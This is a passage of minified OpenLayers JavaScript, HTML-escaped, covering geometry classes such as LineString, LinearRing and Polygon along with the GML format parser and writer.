q=a[d],r=a[n],r=Math.abs(0.5*(p.x*q.y+q.x*r.y+r.x*p.y-q.x*p.y-r.x*q.y-p.x*r.y));p=Math.sqrt(Math.pow(p.x-q.x,2)+Math.pow(p.y-q.y,2));p=2*(r/p);p&gt;l&amp;&amp;(l=p,m=n)&#125;l&gt;k&amp;&amp;m!=b&amp;&amp;(e.push(m),c(a,b,m,k),c(a,m,d,k))&#125;,d=b.length-1,e=[];e.push(0);for(e.push(d);b[0].equals(b[d]);)d--,e.push(d);c(b,0,d,a);a=[];e.sort(function(a,b)&#123;return a-b&#125;);for(d=0;d&lt;e.length;d++)a.push(b[e[d]]);return new OpenLayers.Geometry.LineString(a)&#125;return this&#125;,CLASS_NAME:"OpenLayers.Geometry.LineString"&#125;);OpenLayers.Geometry.MultiLineString=OpenLayers.Class(OpenLayers.Geometry.Collection,&#123;componentTypes:["OpenLayers.Geometry.LineString"],split:function(a,b)&#123;for(var c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k=[],l=[a],m=0,n=this.components.length;m&lt;n;++m)&#123;f=this.components[m];g=!1;for(var p=0;p&lt;l.length;++p)if(e=f.split(l[p],b))&#123;if(d)&#123;g=e[0];for(var q=0,r=g.length;q&lt;r;++q)0===q&amp;&amp;k.length?k[k.length-1].addComponent(g[q]):k.push(new OpenLayers.Geometry.MultiLineString([g[q]]));g=!0;e=e[1]&#125;if(e.length)&#123;e.unshift(p,1);Array.prototype.splice.apply(l,e);break&#125;&#125;g||(k.length?k[k.length-1].addComponent(f.clone()):k=[new OpenLayers.Geometry.MultiLineString(f.clone())])&#125;k&amp;&amp;1&lt;k.length?g=!0:k=[];l&amp;&amp;1&lt;l.length?h=!0:l=[];if(g||h)c=d?[k,l]:l;return c&#125;,splitWith:function(a,b)&#123;var c=null,d=b&amp;&amp;b.mutual,e,f,g,h,k,l;if(a instanceof OpenLayers.Geometry.LineString)&#123;l=[];k=[a];for(var m=0,n=this.components.length;m&lt;n;++m)&#123;g=!1;f=this.components[m];for(var p=0;p&lt;k.length;++p)if(e=k[p].split(f,b))&#123;d&amp;&amp;(g=e[0],g.length&amp;&amp;(g.unshift(p,1),Array.prototype.splice.apply(k,g),p+=g.length-2),e=e[1],0===e.length&amp;&amp;(e=[f.clone()]));g=0;for(var q=e.length;g&lt;q;++g)0===g&amp;&amp;l.length?l[l.length-1].addComponent(e[g]):l.push(new OpenLayers.Geometry.MultiLineString([e[g]]));g=!0&#125;g||(l.length?l[l.length-1].addComponent(f.clone()):l=[new OpenLayers.Geometry.MultiLineString([f.clone()])])&#125;&#125;else c=a.split(this);k&amp;&amp;1&lt;k.length?h=!0:k=[];l&amp;&amp;1&lt;l.length?g=!0:l=[];if(h||g)c=d?[k,l]:l;return c&#125;,CLASS_NAME:"OpenLayers.Geometry.MultiLineString"&#125;);OpenLayers.Geometry.LinearRing=OpenLayers.Class(OpenLayers.Geometry.LineString,&#123;componentTypes:["OpenLayers.Geometry.Point"],addComponent:function(a,b)&#123;var c=!1,d=this.components.pop();null==b&amp;&amp;a.equals(d)||(c=OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,arguments));OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]);return c&#125;,removeComponent:function(a)&#123;var b=this.components&amp;&amp;3&lt;this.components.length;b&amp;&amp;(this.components.pop(),OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,arguments),OpenLayers.Geometry.Collection.prototype.addComponent.apply(this,[this.components[0]]));return b&#125;,move:function(a,b)&#123;for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].move(a,b)&#125;,rotate:function(a,b)&#123;for(var c=0,d=this.components.length;c&lt;d-1;++c)this.components[c].rotate(a,b)&#125;,resize:function(a,b,c)&#123;for(var d=0,e=this.components.length;d&lt;e-1;++d)this.components[d].resize(a,b,c);return this&#125;,transform:function(a,b)&#123;if(a&amp;&amp;b)&#123;for(var c=0,d=this.components.length;c&lt;d-1;c++)this.components[c].transform(a,b);this.bounds=null&#125;return this&#125;,getCentroid:function()&#123;if(this.components)&#123;var a=this.components.length;if(0&lt;a&amp;&amp;2&gt;=a)return this.components[0].clone();if(2&lt;a)&#123;var b=0,c=0,d=this.components[0].x,e=this.components[0].y,f=-1*this.getArea();if(0!=f)&#123;for(var g=0;g&lt;a-1;g++)var h=this.components[g],k=this.components[g+1],b=b+(h.x+k.x-2*d)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e)),c=c+(h.y+k.y-2*e)*((h.x-d)*(k.y-e)-(k.x-d)*(h.y-e));b=d+b/(6*f);a=e+c/(6*f)&#125;else&#123;for(g=0;g&lt;a-1;g++)b+=this.components[g].x,c+=this.components[g].y;b/=a-1;a=c/(a-1)&#125;return new OpenLayers.Geometry.Point(b,a)&#125;return null&#125;&#125;,getArea:function()&#123;var a=0;if(this.components&amp;&amp;2&lt;this.components.length)&#123;for(var b=a=0,c=this.components.length;b&lt;c-1;b++)var d=this.components[b],e=this.components[b+1],a=a+(d.x+e.x)*(e.y-d.y);a=-a/2&#125;return a&#125;,getGeodesicArea:function(a)&#123;var b=this;if(a)&#123;var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))&#125;a=0;c=b.components&amp;&amp;b.components.length;if(2&lt;c)&#123;for(var d,e,f=0;f&lt;c-1;f++)d=b.components[f],e=b.components[f+1],a+=OpenLayers.Util.rad(e.x-d.x)*(2+Math.sin(OpenLayers.Util.rad(d.y))+Math.sin(OpenLayers.Util.rad(e.y)));a=40680631590769*a/2&#125;return a&#125;,containsPoint:function(a)&#123;var b=OpenLayers.Number.limitSigDigs,c=b(a.x,14);a=b(a.y,14);for(var d=this.components.length-1,e,f,g,h,k,l=0,m=0;m&lt;d;++m)if(e=this.components[m],g=b(e.x,14),e=b(e.y,14),f=this.components[m+1],h=b(f.x,14),f=b(f.y,14),e==f)&#123;if(a==e&amp;&amp;(g&lt;=h&amp;&amp;c&gt;=g&amp;&amp;c&lt;=h||g&gt;=h&amp;&amp;c&lt;=g&amp;&amp;c&gt;=h))&#123;l=-1;break&#125;&#125;else&#123;k=b((a-f)*((h-g)/(f-e))+h,14);if(k==c&amp;&amp;(e&lt;f&amp;&amp;a&gt;=e&amp;&amp;a&lt;=f||e&gt;f&amp;&amp;a&lt;=e&amp;&amp;a&gt;=f))&#123;l=-1;break&#125;k&lt;=c||g!=h&amp;&amp;(k&lt;Math.min(g,h)||k&gt;Math.max(g,h))||(e&lt;f&amp;&amp;a&gt;=e&amp;&amp;a&lt;f||e&gt;f&amp;&amp;a&lt;e&amp;&amp;a&gt;=f)&amp;&amp;++l&#125;return-1==l?1:!!(l&amp;1)&#125;,intersects:function(a)&#123;var b=!1;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME)b=a.intersects(this);else if("OpenLayers.Geometry.LinearRing"==a.CLASS_NAME)b=OpenLayers.Geometry.LineString.prototype.intersects.apply(this,[a]);else for(var c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=a.components[c].intersects(this));++c);return b&#125;,getVertices:function(a)&#123;return!0===a?[]:this.components.slice(0,this.components.length-1)&#125;,CLASS_NAME:"OpenLayers.Geometry.LinearRing"&#125;);OpenLayers.Geometry.Polygon=OpenLayers.Class(OpenLayers.Geometry.Collection,&#123;componentTypes:["OpenLayers.Geometry.LinearRing"],getArea:function()&#123;var a=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var a=a+Math.abs(this.components[0].getArea()),b=1,c=this.components.length;b&lt;c;b++)a-=Math.abs(this.components[b].getArea());return a&#125;,getGeodesicArea:function(a)&#123;var b=0;if(this.components&amp;&amp;0&lt;this.components.length)for(var b=b+Math.abs(this.components[0].getGeodesicArea(a)),c=1,d=this.components.length;c&lt;d;c++)b-=Math.abs(this.components[c].getGeodesicArea(a));return b&#125;,containsPoint:function(a)&#123;var b=this.components.length,c=!1;if(0&lt;b&amp;&amp;(c=this.components[0].containsPoint(a),1!==c&amp;&amp;c&amp;&amp;1&lt;b))for(var d,e=1;e&lt;b;++e)if(d=this.components[e].containsPoint(a))&#123;c=1===d?1:!1;break&#125;return c&#125;,intersects:function(a)&#123;var b=!1,c,d;if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.containsPoint(a);else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME)&#123;c=0;for(d=this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);if(!b)for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.containsPoint(a.components[c]));++c);&#125;else for(c=0,d=a.components.length;c&lt;d&amp;&amp;!(b=this.intersects(a.components[c]));++c);if(!b&amp;&amp;"OpenLayers.Geometry.Polygon"==a.CLASS_NAME)&#123;var e=this.components[0];c=0;for(d=e.components.length;c&lt;d&amp;&amp;!(b=a.containsPoint(e.components[c]));++c);&#125;return b&#125;,distanceTo:function(a,b)&#123;return b&amp;&amp;!1===b.edge&amp;&amp;this.intersects(a)?0:OpenLayers.Geometry.Collection.prototype.distanceTo.apply(this,[a,b])&#125;,CLASS_NAME:"OpenLayers.Geometry.Polygon"&#125;);OpenLayers.Geometry.Polygon.createRegularPolygon=function(a,b,c,d)&#123;var e=Math.PI*(1/c-0.5);d&amp;&amp;(e+=d/180*Math.PI);for(var f,g=[],h=0;h&lt;c;++h)f=e+2*h*Math.PI/c,d=a.x+b*Math.cos(f),f=a.y+b*Math.sin(f),g.push(new OpenLayers.Geometry.Point(d,f));a=new OpenLayers.Geometry.LinearRing(g);return new OpenLayers.Geometry.Polygon([a])&#125;;OpenLayers.Geometry.MultiPolygon=OpenLayers.Class(OpenLayers.Geometry.Collection,&#123;componentTypes:["OpenLayers.Geometry.Polygon"],CLASS_NAME:"OpenLayers.Geometry.MultiPolygon"&#125;);OpenLayers.Format.GML=OpenLayers.Class(OpenLayers.Format.XML,&#123;featureNS:"http://mapserver.gis.umn.edu/mapserver",featurePrefix:"feature",featureName:"featureMember",layerName:"features",geometryName:"geometry",collectionName:"FeatureCollection",gmlns:"http://www.opengis.net/gml",extractAttributes:!0,xy:!0,initialize:function(a)&#123;this.regExes=&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=this.getElementsByTagNameNS(a.documentElement,this.gmlns,this.featureName);for(var b=[],c=0;c&lt;a.length;c++)&#123;var d=this.parseFeature(a[c]);d&amp;&amp;b.push(d)&#125;return b&#125;,parseFeature:function(a)&#123;for(var b="MultiPolygon Polygon MultiLineString LineString MultiPoint Point Envelope".split(" "),c,d,e,f=0;f&lt;b.length;++f)if(c=b[f],d=this.getElementsByTagNameNS(a,this.gmlns,c),0&lt;d.length)&#123;if(e=this.parseGeometry[c.toLowerCase()])e=e.apply(this,[d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break&#125;var g;c=this.getElementsByTagNameNS(a,this.gmlns,"Box");for(f=0;f&lt;c.length;++f)b=c[f],d=this.parseGeometry.box.apply(this,[b]),b=b.parentNode,"boundedBy"===(b.localName||b.nodeName.split(":").pop())?g=d:e=d.toGeometry();var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));h=new OpenLayers.Feature.Vector(e,h);h.bounds=g;h.gml=&#123;featureType:a.firstChild.nodeName.split(":")[1],featureNS:a.firstChild.namespaceURI,featureNSPrefix:a.firstChild.prefix&#125;;a=a.firstChild;for(var k;a&amp;&amp;(1!=a.nodeType||!(k=a.getAttribute("fid")||a.getAttribute("id")));)a=a.nextSibling;h.fid=k;return h&#125;,parseGeometry:&#123;point:function(a)&#123;var b,c;c=[];b=this.getElementsByTagNameNS(a,this.gmlns,"pos");0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),0&lt;b.length&amp;&amp;(c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.removeSpace,""),c=c.split(",")));0==c.length&amp;&amp;(b=this.getElementsByTagNameNS(a,this.gmlns,"coord"),0&lt;b.length&amp;&amp;(a=this.getElementsByTagNameNS(b[0],this.gmlns,"X"),b=this.getElementsByTagNameNS(b[0],this.gmlns,"Y"),0&lt;a.length&amp;&amp;0&lt;b.length&amp;&amp;(c=[a[0].firstChild.nodeValue,b[0].firstChild.nodeValue])));2==c.length&amp;&amp;(c[2]=null);return this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])&#125;,multipoint:function(a)&#123;a=this.getElementsByTagNameNS(a,this.gmlns,"Point");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.point.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPoint(b)&#125;,linestring:function(a,b)&#123;var c,d;d=[];var e=[];c=this.getElementsByTagNameNS(a,this.gmlns,"posList");if(0&lt;c.length)&#123;d=this.getChildValue(c[0]);d=d.replace(this.regExes.trimSpace,"");d=d.split(this.regExes.splitSpace);var f=parseInt(c[0].getAttribute("dimension")),g,h,k;for(c=0;c&lt;d.length/f;++c)g=c*f,h=d[g],k=d[g+1],g=2==f?null:d[g+2],this.xy?e.push(new OpenLayers.Geometry.Point(h,k,g)):e.push(new OpenLayers.Geometry.Point(k,h,g))&#125;if(0==d.length&amp;&amp;(c=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),0&lt;c.length))for(d=this.getChildValue(c[0]),d=d.replace(this.regExes.trimSpace,""),d=d.replace(this.regExes.trimComma,","),f=d.split(this.regExes.splitSpace),c=0;c&lt;f.length;++c)d=f[c].split(","),2==d.length&amp;&amp;(d[2]=null),this.xy?e.push(new OpenLayers.Geometry.Point(d[0],d[1],d[2])):e.push(new OpenLayers.Geometry.Point(d[1],d[0],d[2]));d=null;0!=e.length&amp;&amp;(d=b?new OpenLayers.Geometry.LinearRing(e):new OpenLayers.Geometry.LineString(e));return d&#125;,multilinestring:function(a)&#123;a=this.getElementsByTagNameNS(a,this.gmlns,"LineString");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiLineString(b)&#125;,polygon:function(a)&#123;a=this.getElementsByTagNameNS(a,this.gmlns,"LinearRing");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.linestring.apply(this,[a[d],!0]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.Polygon(b)&#125;,multipolygon:function(a)&#123;a=this.getElementsByTagNameNS(a,this.gmlns,"Polygon");var b=[];if(0&lt;a.length)for(var c,d=0;d&lt;a.length;++d)(c=this.parseGeometry.polygon.apply(this,[a[d]]))&amp;&amp;b.push(c);return new OpenLayers.Geometry.MultiPolygon(b)&#125;,envelope:function(a)&#123;var b=[],c,d,e=this.getElementsByTagNameNS(a,this.gmlns,"lowerCorner");if(0&lt;e.length)&#123;c=[];0&lt;e.length&amp;&amp;(c=e[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var f=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])&#125;a=this.getElementsByTagNameNS(a,this.gmlns,"upperCorner");if(0&lt;a.length)&#123;c=[];0&lt;a.length&amp;&amp;(c=a[0].firstChild.nodeValue,c=c.replace(this.regExes.trimSpace,""),c=c.split(this.regExes.splitSpace));2==c.length&amp;&amp;(c[2]=null);var g=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2])&#125;f&amp;&amp;g&amp;&amp;(b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,f.y)),b.push(new OpenLayers.Geometry.Point(g.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,g.y)),b.push(new OpenLayers.Geometry.Point(f.x,f.y)),b=new OpenLayers.Geometry.LinearRing(b),d=new OpenLayers.Geometry.Polygon([b]));return d&#125;,box:function(a)&#123;var b=this.getElementsByTagNameNS(a,this.gmlns,"coordinates"),c=a=null;0&lt;b.length&amp;&amp;(b=b[0].firstChild.nodeValue,b=b.split(" "),2==b.length&amp;&amp;(a=b[0].split(","),c=b[1].split(",")));if(null!==a&amp;&amp;null!==c)return new OpenLayers.Bounds(parseFloat(a[0]),parseFloat(a[1]),parseFloat(c[0]),parseFloat(c[1]))&#125;&#125;,parseAttributes:function(a)&#123;var b=&#123;&#125;;a=a.firstChild;for(var c,d,e;a;)&#123;if(1==a.nodeType)&#123;a=a.childNodes;for(c=0;c&lt;a.length;++c)if(d=a[c],1==d.nodeType)if(e=d.childNodes,1==e.length)&#123;if(e=e[0],3==e.nodeType||4==e.nodeType)d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,e=e.nodeValue.replace(this.regExes.trimSpace,""),b[d]=e&#125;else b[d.nodeName.split(":").pop()]=null;break&#125;a=a.nextSibling&#125;return b&#125;,write:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS("http://www.opengis.net/wfs","wfs:"+this.collectionName),c=0;c&lt;a.length;c++)b.appendChild(this.createFeatureXML(a[c]));return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,createFeatureXML:function(a)&#123;var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.geometryName);c.appendChild(b);var b=this.createElementNS(this.gmlns,"gml:"+this.featureName),d=this.createElementNS(this.featureNS,this.featurePrefix+":"+this.layerName);d.setAttribute("fid",a.fid||a.id);d.appendChild(c);for(var e in a.attributes)&#123;var c=this.createTextNode(a.attributes[e]),f=e.substring(e.lastIndexOf(":")+1),f=this.createElementNS(this.featureNS,this.featurePrefix+":"+f);f.appendChild(c);d.appendChild(f)&#125;b.appendChild(d);return b&#125;,buildGeometryNode:function(a)&#123;this.externalProjection&amp;&amp;this.internalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1);return this.buildGeometry[b.toLowerCase()].apply(this,[a])&#125;,buildGeometry:&#123;point:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:Point");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,multipoint:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:MultiPoint");a=a.components;for(var c,d,e=0;e&lt;a.length;e++)c=this.createElementNS(this.gmlns,"gml:pointMember"),d=this.buildGeometry.point.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b&#125;,linestring:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:LineString");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,multilinestring:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:MultiLineString");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:lineStringMember"),d=this.buildGeometry.linestring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b&#125;,linearring:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,polygon:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:Polygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.gmlns,"gml:"+c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b&#125;,multipolygon:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:MultiPolygon");a=a.components;for(var c,d,e=0;e&lt;a.length;++e)c=this.createElementNS(this.gmlns,"gml:polygonMember"),d=this.buildGeometry.polygon.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b&#125;,bounds:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:Box");b.appendChild(this.buildCoordinatesNode(a));return b&#125;&#125;,buildCoordinatesNode:function(a)&#123;var b=this.createElementNS(this.gmlns,"gml:coordinates");b.setAttribute("decimal",".");b.setAttribute("cs",",");b.setAttribute("ts"," ");var c=[];if(a instanceof OpenLayers.Bounds)c.push(a.left+","+a.bottom),c.push(a.right+","+a.top);else&#123;a=a.components?a.components:[a];for(var d=0;d&lt;a.length;d++)c.push(a[d].x+","+a[d].y)&#125;c=this.createTextNode(c.join(" "));b.appendChild(c);return b&#125;,CLASS_NAME:"OpenLayers.Format.GML"&#125;);OpenLayers.Format.GML||(OpenLayers.Format.GML=&#123;&#125;);OpenLayers.Format.GML.Base=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs"&#125;,defaultPrefix:"gml",schemaLocation:null,featureType:null,featureNS:null,geometryName:"geometry",extractAttributes:!0,srsName:null,xy:!0,geometryTypes:null,singleFeatureType:null,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,featureMember:/^(.*:)?featureMembers?$/&#125;,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.setGeometryTypes();a&amp;&amp;a.featureNS&amp;&amp;this.setNamespace("feature",a.featureNS);this.singleFeatureType=!a||"string"===typeof a.featureType&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=[];this.readNode(a,&#123;features:b&#125;,!0);if(0==b.length)&#123;var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember");if(c.length)&#123;a=0;for(var d=c.length;a&lt;d;++a)this.readNode(c[a],&#123;features:b&#125;,!0)&#125;else c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMembers"),c.length&amp;&amp;this.readNode(c[0],&#123;features:b&#125;,!0)&#125;return b&#125;,readNode:function(a,b,c)&#123;!0===c&amp;&amp;!0===this.autoConfig&amp;&amp;(this.featureType=null,delete this.namespaceAlias[this.featureNS],delete this.namespaces.feature,this.featureNS=null);this.featureNS||(a.prefix in this.namespaces||a.parentNode.namespaceURI!=this.namespaces.gml||!this.regExes.featureMember.test(a.parentNode.nodeName))||(this.featureType=a.nodeName.split(":").pop(),this.setNamespace("feature",a.namespaceURI),this.featureNS=a.namespaceURI,this.autoConfig=!0);return OpenLayers.Format.XML.prototype.readNode.apply(this,[a,b])&#125;,readers:&#123;gml:&#123;_inherit:function(a,b,c)&#123;&#125;,featureMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,featureMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,boundedBy:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);c.components&amp;&amp;0&lt;c.components.length&amp;&amp;(b.bounds=c.components[0])&#125;,Point:function(a,b)&#123;var c=&#123;points:[]&#125;;this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(c.points[0])&#125;,coordinates:function(a,b)&#123;for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace),d,e=c.length,f=Array(e),g=0;g&lt;e;++g)d=c[g].split(","),f[g]=this.xy?new OpenLayers.Geometry.Point(d[0],d[1],d[2]):new OpenLayers.Geometry.Point(d[1],d[0],d[2]);b.points=f&#125;,coord:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.points||(b.points=[]);b.points.push(new OpenLayers.Geometry.Point(c.x,c.y,c.z))&#125;,X:function(a,b)&#123;b.x=this.getChildValue(a)&#125;,Y:function(a,b)&#123;b.y=this.getChildValue(a)&#125;,Z:function(a,b)&#123;b.z=this.getChildValue(a)&#125;,MultiPoint:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPoint(c.components)]&#125;,pointMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,LineString:function(a,b)&#123;var c=&#123;&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))&#125;,MultiLineString:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiLineString(c.components)]&#125;,lineStringMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Polygon:function(a,b)&#123;var c=&#123;outer:null,inner:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);c.inner.unshift(c.outer);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.Polygon(c.inner))&#125;,LinearRing:function(a,b)&#123;var c=&#123;&#125;;this.readers.gml._inherit.apply(this,[a,c]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.LinearRing(c.points)]&#125;,MultiPolygon:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)]&#125;,polygonMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,GeometryCollection:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components=[new OpenLayers.Geometry.Collection(c.components)]&#125;,geometryMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;&#125;,feature:&#123;"*":function(a,b)&#123;var c,d=a.localName||a.nodeName.split(":").pop();b.features?this.singleFeatureType||-1===OpenLayers.Util.indexOf(this.featureType,d)?d===this.featureType&amp;&amp;(c="_typeName"):c="_typeName":0==a.childNodes.length||1==a.childNodes.length&amp;&amp;3==a.firstChild.nodeType?this.extractAttributes&amp;&amp;(c="_attribute"):c="_geometry";c&amp;&amp;this.readers.feature[c].apply(this,[a,b])&#125;,_typeName:function(a,b)&#123;var c=&#123;components:[],attributes:&#123;&#125;&#125;;this.readChildNodes(a,c);c.name&amp;&amp;(c.attributes.name=c.name);var d=new OpenLayers.Feature.Vector(c.components[0],c.attributes);this.singleFeatureType||(d.type=a.nodeName.split(":").pop(),d.namespace=a.namespaceURI);var e=a.getAttribute("fid")||this.getAttributeNS(a,this.namespaces.gml,"id");e&amp;&amp;(d.fid=e);this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;d.geometry)&amp;&amp;d.geometry.transform(this.externalProjection,this.internalProjection);c.bounds&amp;&amp;(d.bounds=c.bounds);b.features.push(d)&#125;,_geometry:function(a,b)&#123;this.geometryName||(this.geometryName=a.nodeName.split(":").pop());this.readChildNodes(a,b)&#125;,_attribute:function(a,b)&#123;var c=a.localName||a.nodeName.split(":").pop(),d=this.getChildValue(a);b.attributes[c]=d&#125;&#125;,wfs:&#123;FeatureCollection:function(a,b)&#123;this.readChildNodes(a,b)&#125;&#125;&#125;,write:function(a)&#123;var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;gml:&#123;featureMember:function(a)&#123;var b=this.createElementNSPlus("gml:featureMember");this.writeNode("feature:_typeName",a,b);return b&#125;,MultiPoint:function(a)&#123;var b=this.createElementNSPlus("gml:MultiPoint");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("pointMember",a[c],b);return b&#125;,pointMember:function(a)&#123;var b=this.createElementNSPlus("gml:pointMember");this.writeNode("Point",a,b);return b&#125;,MultiLineString:function(a)&#123;var b=this.createElementNSPlus("gml:MultiLineString");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("lineStringMember",a[c],b);return b&#125;,lineStringMember:function(a)&#123;var b=this.createElementNSPlus("gml:lineStringMember");this.writeNode("LineString",a,b);return b&#125;,MultiPolygon:function(a)&#123;var b=this.createElementNSPlus("gml:MultiPolygon");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("polygonMember",a[c],b);return b&#125;,polygonMember:function(a)&#123;var b=this.createElementNSPlus("gml:polygonMember");this.writeNode("Polygon",a,b);return b&#125;,GeometryCollection:function(a)&#123;for(var b=this.createElementNSPlus("gml:GeometryCollection"),c=0,d=a.components.length;c&lt;d;++c)this.writeNode("geometryMember",a.components[c],b);return b&#125;,geometryMember:function(a)&#123;var b=this.createElementNSPlus("gml:geometryMember");a=this.writeNode("feature:_geometry",a);b.appendChild(a.firstChild);return b&#125;&#125;,feature:&#123;_typeName:function(a)&#123;var 